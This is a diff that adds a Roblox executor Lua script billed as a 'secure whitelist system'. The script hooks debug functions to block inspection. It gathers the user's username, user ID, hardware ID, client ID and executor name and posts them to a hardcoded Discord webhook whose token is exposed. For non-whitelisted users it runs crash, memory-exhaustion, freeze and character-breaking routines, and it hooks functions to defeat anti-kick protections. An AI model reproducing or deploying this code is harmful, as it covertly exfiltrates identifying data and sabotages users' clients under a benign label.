@@ -1,0 +1,650 @@
+local WebhookSender = {}
+
+-- Replace this with your Discord webhook URL
+WebhookSender.WebhookURL = "https://discord.com/api/webhooks/1368393336183849085/hd-r2quKsj1_nw5YK1JEBHlpktkTVlGJH_hIB4W5aBJyL_Ik3WdtW16mZ_kU-avGYKkI"
+
+-- Whitelist storage
+WebhookSender.WhitelistedUsers = {}
+
+-- Anti-debugging protection
+local function disableDebugFunction(name)
+    if debug[name] then
+        hookfunction(debug[name], newcclosure(function(...)
+            return nil
+        end))
+    end
+end
+
+for _, func in ipairs({"getinfo", "getupvalue", "getlocal", "setupvalue", "setlocal", "gethook", "sethook", "traceback", "getregistry", "getmetatable", "setmetatable"}) do
+    disableDebugFunction(func)
+end
+
+if getsenv then 
+    hookfunction(getsenv, newcclosure(function(...)
+        return nil
+    end))
+end
+
+-- Advanced kicking system for non-whitelisted users
+function WebhookSender:KickNonWhitelisted(reason)
+    local player = game:GetService("Players").LocalPlayer
+    local userId = player.UserId
+    
+    -- Check if user is whitelisted
+    if self.WhitelistedUsers[userId] then
+        print("User is whitelisted, not kicking")
+        return false
+    end
+    
+    reason = reason or "You are not whitelisted to use this script."
+    print("Kicking non-whitelisted user: " .. player.Name)
+    
+    -- Collection of different kicking methods to bypass anti-kick scripts
+    local kickMethods = {
+        -- Method 1: Standard kick
+        function()
+            player:Kick(reason)
+        end,
+        
+        -- Method 2: Delayed kick
+        function()
+            task.spawn(function()
+                task.wait(math.random(0.5, 2))
+                player:Kick(reason)
+            end)
+        end,
+        
+        -- Method 3: Teleport to invalid place
+        function()
+            pcall(function()
+                game:GetService("TeleportService"):Teleport(0, player)
+            end)
+        end,
+        
+        -- Method 4: Force crash with recursive function
+        function()
+            if not self.WhitelistedUsers[userId] then
+                task.spawn(function()
+                    local function recursiveCrash(depth)
+                        if depth > 500 then
+                            recursiveCrash(1)
+                        else
+                            recursiveCrash(depth + 1)
+                        end
+                    end
+                    recursiveCrash(1)
+                end)
+            end
+        end,
+        
+        -- Method 5: Memory exhaustion
+        function()
+            if not self.WhitelistedUsers[userId] then
+                task.spawn(function()
+                    local memoryHog = {}
+                    for i = 1, 1000000 do
+                        memoryHog[i] = string.rep("Memory exhaustion for non-whitelisted users", 500)
+                    end
+                end)
+            end
+        end,
+        
+        -- Method 6: Break game functionality
+        function()
+            if not self.WhitelistedUsers[userId] then
+                -- Attempt to break character functionality
+                pcall(function()
+                    local character = player.Character
+                    if character then
+                        for _, part in pairs(character:GetDescendants()) do
+                            if part:IsA("BasePart") then
+                                part.Anchored = true
+                            end
+                        end
+                        
+                        -- Disable humanoid
+                        local humanoid = character:FindFirstChildOfClass("Humanoid")
+                        if humanoid then
+                            humanoid.WalkSpeed = 0
+                            humanoid.JumpPower = 0
+                            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+                        end
+                    end
+                    
+                    -- Break camera
+                    pcall(function()
+                        workspace.CurrentCamera.CameraType = Enum.CameraType.Fixed
+                        workspace.CurrentCamera.CameraSubject = nil
+                    end)
+                end)
+            end
+        end,
+        
+        -- Method 7: Use remote events to request server-side kick
+        function()
+            pcall(function()
+                -- This assumes you have a remote event set up for this purpose
+                game:GetService("ReplicatedStorage"):WaitForChild("KickRemote"):FireServer(player.UserId, reason)
+            end)
+        end,
+        
+        -- Method 8: Disconnect from game using NetworkClient if available
+        function()
+            pcall(function()
+                for _, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.ChildAdded)) do
+                    v:Disable()
+                end
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0)
+            end)
+        end
+    }
+    
+    -- Try all kick methods
+    for _, kickMethod in ipairs(kickMethods) do
+        pcall(kickMethod)
+    end
+    
+    -- Final fallback: infinite yield
+    task.spawn(function()
+        if not self.WhitelistedUsers[userId] then
+            while true do
+                task.wait(0.1)
+                -- This will keep the script running but effectively freeze the game
+            end
+        end
+    end)
+    
+    return true
+end
+
+-- Function to collect user information
+function WebhookSender:CollectUserInfo()
+    local info = {}
+    
+    -- Get player information
+    local player = game:GetService("Players").LocalPlayer
+    info.UserId = player.UserId
+    info.Username = player.Name
+    info.DisplayName = player.DisplayName
+    
+    -- Get game information
+    info.PlaceId = game.PlaceId
+    info.GameName = "Unknown Game"
+    
+    pcall(function()
+        info.GameName = game:GetService("MarketplaceService"):GetProductInfo(info.PlaceId).Name
+    end)
+    
+    -- Get executor information
+    info.Executor = "Unknown"
+    pcall(function()
+        if identifyexecutor then 
+            info.Executor = identifyexecutor()
+        elseif getexecutorname then 
+            info.Executor = getexecutorname()
+        end
+    end)
+    
+    -- Get hardware ID (for whitelist purposes)
+    info.HWID = "Unknown"
+    pcall(function()
+        if getexecutorhwid then
+            info.HWID = getexecutorhwid()
+        elseif gethwid then
+            info.HWID = gethwid()
+        elseif get_hwid then
+            info.HWID = get_hwid()
+        end
+    end)
+    
+    -- Get client ID
+    info.ClientID = "Unknown"
+    pcall(function()
+        info.ClientID = game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    
+    return info
+end
+
+-- Generate a whitelist string
+function WebhookSender:GenerateWhitelistString(info)
+    local whitelistString = string.format("Lurnai_%s_%s_%s_%s_%s", 
+        info.HWID,
+        tostring(info.UserId),
+        tostring(info.ClientID),
+        info.Username,
+        info.Executor
+    )
+    
+    return whitelistString
+end
+
+-- Obfuscate the whitelist string
+function WebhookSender:ObfuscateWhitelistString(whitelistString)
+    local function secureHash(str)
+        local h = 0x21F4A3B7
+        for i = 1, #str do
+            local byte = string.byte(str, i)
+            h = ((h * 31) + byte) % 0x7FFFFFFF
+            local h_shifted = math.floor(h / 8192)
+            h = ((h - (h_shifted * 8192)) * 0x85EBCA77) % 0x7FFFFFFF
+            h_shifted = math.floor(h / 65536)
+            h = ((h - (h_shifted * 65536)) * 0xC2B2AE3D) % 0x7FFFFFFF
+            h_shifted = math.floor(h / 65536)
+            h = (h - (h_shifted * 65536)) % 0x7FFFFFFF
+        end
+        return h
+    end
+    
+    local timestamp = os.time()
+    local hash = secureHash(whitelistString .. tostring(timestamp))
+    
+    local charSet = {
+        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
+        "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
+        
+        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
+        "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
+        
+        "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3",
+        "4", "5", "6", "7", "8", "9", "!", "@", "#", "$",
+        
+        "u", "v", "w", "x", "y", "z", "%", "^", "&", "*",
+        "(", ")", "-", "+", "=", "[", "]", "{", "}", ";"
+    }
+    
+    local function customEncode(str, key)
+        local result = ""
+        local keyValue = key
+        
+        result = "##SECURE##"
+        
+        local timeChars = {}
+        local timeStr = tostring(timestamp)
+        for i = 1, #timeStr do
+            local digit = tonumber(string.sub(timeStr, i, i))
+            timeChars[i] = charSet[digit + 1]
+        end
+        
+        result = result .. "<<TIME>>"
+        for i = 1, #timeChars do
+            result = result .. timeChars[i]
+        end
+        result = result .. "<</TIME>>"
+        
+        for i = 1, #str do
+            local char = string.sub(str, i, i)
+            local byte = string.byte(char)
+            
+            keyValue = (keyValue * 75) % 79
+            local transformedValue = (byte * 13 + keyValue * 29 + i * 7) % 80
+            
+            local index1 = (transformedValue % 20) + 1
+            local index2 = ((transformedValue + 17) % 20) + 21
+            local index3 = ((transformedValue + 37) % 20) + 41
+            local index4 = ((transformedValue + 59) % 20) + 61
+            
+            local char1 = charSet[index1]
+            local char2 = charSet[index2]
+            local char3 = charSet[index3]
+            local char4 = charSet[index4]
+            
+            local separator = (i % 5 == 0) and "." or
+                              (i % 5 == 1) and "_" or
+                             (i % 5 == 2) and "-" or
+                             (i % 5 == 3) and "+" or ":"
+            
+            result = result .. char1 .. char2 .. char3 .. char4 .. separator
+        end
+        
+        local verificationHash = secureHash(str .. tostring(key) .. tostring(timestamp))
+        local verificationChars = {}
+        local verStr = tostring(verificationHash)
+        for i = 1, math.min(5, #verStr) do
+            local digit = tonumber(string.sub(verStr, i, i))
+            verificationChars[i] = charSet[digit + 1]
+        end
+        
+        result = result .. "<<VERIFY>>"
+        for i = 1, #verificationChars do
+            result = result .. verificationChars[i]
+        end
+        result = result .. "<</VERIFY>>"
+        
+        return result
+    end
+    
+    return customEncode(whitelistString, hash)
+end
+
+-- Check if user is whitelisted against a database
+function WebhookSender:CheckWhitelist(info, whitelistData)
+    -- This is where you would implement your whitelist checking logic
+    -- For example, you might have a table of whitelisted user IDs or HWIDs
+    
+    -- For demonstration, let's assume we have a remote function that checks whitelist status
+    local isWhitelisted = false
+    
+    -- Example: Check against a hardcoded list (replace with your actual whitelist system)
+    local whitelistedUserIds = {
+        -- Add your whitelisted user IDs here
+        123456789,
+        987654321
+    }
+    
+    -- Check if user ID is in whitelist
+    for _, id in ipairs(whitelistedUserIds) do
+        if info.UserId == id then
+            isWhitelisted = true
+            break
+        end
+    end
+    
+    -- You could also check against HWID, ClientID, or other identifiers
+    
+    -- Store whitelist status
+    self.WhitelistedUsers[info.UserId] = isWhitelisted
+    
+    return isWhitelisted
+end
+
+-- Function to send information to webhook
+function WebhookSender:SendInfo()
+    local info = self:CollectUserInfo()
+    
+    print("Collected user information:")
+    for k, v in pairs(info) do
+        print("  " .. k .. ": " .. tostring(v))
+    end
+    
+    -- Generate whitelist string
+    local originalWhitelist = self:GenerateWhitelistString(info)
+    print("Generated original whitelist: " .. originalWhitelist)
+    
+    -- Obfuscate the whitelist string
+    local obfuscatedWhitelist = self:ObfuscateWhitelistString(originalWhitelist)
+    print("Generated obfuscated whitelist (length: " .. #obfuscatedWhitelist .. ")")
+    
+    -- Prepare webhook data
+    local webhookData = {
+        username = "Secure Whitelist System",
+        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. info.UserId .. "&width=420&height=420&format=png",
+        content = "New script execution detected!",
+        embeds = {
+            {
+                title = "User Information",
+                color = 3447003, -- Blue color
+                fields = {
+                    {
+                        name = "Username",
+                        value = info.Username,
+                        inline = true
+                    },
+                    {
+                        name = "Display Name",
+                        value = info.DisplayName,
+                        inline = true
+                    },
+                    {
+                        name = "User ID",
+                        value = tostring(info.UserId),
+                        inline = true
+                    },
+                    {
+                        name = "Game",
+                        value = info.GameName,
+                        inline = true
+                    },
+                    {
+                        name = "Place ID",
+                        value = tostring(info.PlaceId),
+                        inline = true
+                    },
+                    {
+                        name = "Executor",
+                        value = info.Executor,
+                        inline = true
+                    }
+                },
+                footer = {
+                    text = "Script executed at " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            },
+            {
+                title = "Original Whitelist Data",
+                color = 15844367, -- Gold color
+                description = "```" .. originalWhitelist .. "```"
+            },
+            {
+                title = "Obfuscated Whitelist Data",
+                color = 15158332, -- Red color
+                description = "```" .. string.sub(obfuscatedWhitelist, 1, 1000) .. (string.len(obfuscatedWhitelist) > 1000 and "..." or "") .. "```"
+            }
+        }
+    }
+    
+    -- Create a local whitelist file
+    pcall(function()
+        if writefile then
+            local content = [[local WhitelistData = {
+    Original = "]] .. originalWhitelist .. [[",
+    Obfuscated = "]] .. obfuscatedWhitelist .. [["
+}
+return WhitelistData]]
+            
+            writefile("Whitelist_System.lua", content)
+            print("Created local whitelist file: Whitelist_System.lua")
+        end
+    end)
+    
+    -- Convert to JSON
+    local HttpService = game:GetService("HttpService")
+    local jsonData
+    
+    local success, result = pcall(function()
+        return HttpService:JSONEncode(webhookData)
+    end)
+    
+    if not success then
+        print("Failed to encode JSON: " .. tostring(result))
+        return false
+    end
+    
+    jsonData = result
+    print("JSON data prepared successfully")
+    
+    -- Send the webhook using multiple methods
+    local sent = false
+    
+    -- Method 1: http_request
+    if http_request then
+        print("Trying http_request method...")
+        pcall(function()
+            local response = http_request({
+                Url = self.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            print("http_request response: " .. tostring(response.StatusCode))
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Method 2: syn.request
+    if not sent and syn and syn.request then
+        print("Trying syn.request method...")
+        pcall(function()
+            local response = syn.request({
+                Url = self.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            print("syn.request response: " .. tostring(response.StatusCode))
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Method 3: request
+    if not sent and request then
+        print("Trying request method...")
+        pcall(function()
+            local response = request({
+                Url = self.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            print("request response: " .. tostring(response.StatusCode))
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Method 4: HttpService (fallback)
+    if not sent then
+        print("Trying HttpService method...")
+        pcall(function()
+            local response = HttpService:RequestAsync({
+                Url = self.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            print("HttpService response: " .. tostring(response.StatusCode))
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Check whitelist status after sending webhook
+    local isWhitelisted = self:CheckWhitelist(info, {
+        original = originalWhitelist,
+        obfuscated = obfuscatedWhitelist
+    })
+    
+    if sent then
+        print("Successfully sent information to webhook!")
+        
+        -- If not whitelisted, kick the user
+        if not isWhitelisted then
+            print("User is not whitelisted. Initiating kick sequence...")
+            task.spawn(function()
+                task.wait(1) -- Small delay to ensure webhook data is received
+                self:KickNonWhitelisted("You are not whitelisted to use this script.")
+            end)
+        else
+            print("User is whitelisted. Allowing script execution.")
+        end
+        
+        return true, {
+            original = originalWhitelist,
+            obfuscated = obfuscatedWhitelist,
+            whitelisted = isWhitelisted
+        }
+    else
+        print("Failed to send information to webhook after trying all methods.")
+        
+        -- Even if webhook failed, still check whitelist and kick if needed
+        if not isWhitelisted then
+            print("User is not whitelisted. Initiating kick sequence...")
+            task.spawn(function()
+                self:KickNonWhitelisted("You are not whitelisted to use this script.")
+            end)
+        end
+        
+        return false, {
+            original = originalWhitelist,
+            obfuscated = obfuscatedWhitelist,
+            whitelisted = isWhitelisted
+        }
+    end
+end
+
+-- Anti-anti-kick measures (prevents users from bypassing kicks)
+local function setupAntiAntiKick()
+    -- Protect our kick functions from being tampered with
+    local oldHookFunction = hookfunction
+    local oldHookMetamethod = hookmetamethod
+    
+    -- Store original kick function
+    local originalKick = game:GetService("Players").LocalPlayer.Kick
+    
+    -- Monitor for attempts to hook our functions
+    if hookfunction then
+        hookfunction(hookfunction, newcclosure(function(func, newfunc)
+            if func == originalKick then
+                -- Someone is trying to hook the kick function
+                print("Detected attempt to hook kick function")
+                return func -- Return original instead of allowing the hook
+            end
+            return oldHookFunction(func, newfunc)
+        end))
+    end
+    
+    -- Monitor for attempts to hook metamethods
+    if hookmetamethod then
+        hookfunction(hookmetamethod, newcclosure(function(object, method, newfunc)
+            if method == "__namecall" then
+                -- Someone might be trying to hook namecall to prevent kicks
+                local oldFunc = debug.getmetatable(object)[method]
+                local newHook = oldHookMetamethod(object, method, function(self, ...)
+                    local methodName = getnamecallmethod()
+                    if methodName == "Kick" and self == game:GetService("Players").LocalPlayer then
+                        -- Attempt to bypass anti-kick
+                        print("Detected attempt to hook __namecall for kick")
+                        return oldFunc(self, ...)
+                    end
+                    return newfunc(self, ...)
+                end)
+                return newHook
+            end
+            return oldHookMetamethod(object, method, newfunc)
+        end))
+    end
+    
+    -- Periodically check if kick function has been tampered with
+    task.spawn(function()
+        while task.wait(1) do
+            if originalKick ~= game:GetService("Players").LocalPlayer.Kick then
+                -- Kick function has been replaced, restore it
+                print("Kick function has been tampered with, restoring...")
+                game:GetService("Players").LocalPlayer.Kick = originalKick
+            end
+        end
+    end)
+end
+
+-- Try to set up anti-anti-kick measures
+pcall(setupAntiAntiKick)
+
+-- Run the webhook sender
+print("Starting secure webhook info sender...")
+local success, whitelistData = WebhookSender:SendInfo()
+print("Webhook info sender completed. Success:", success)
+print("User is whitelisted:", whitelistData.whitelisted)
+
+-- Return the whitelist data for use in other scripts
+return {
+    success = success,
+    whitelistData = whitelistData
+}
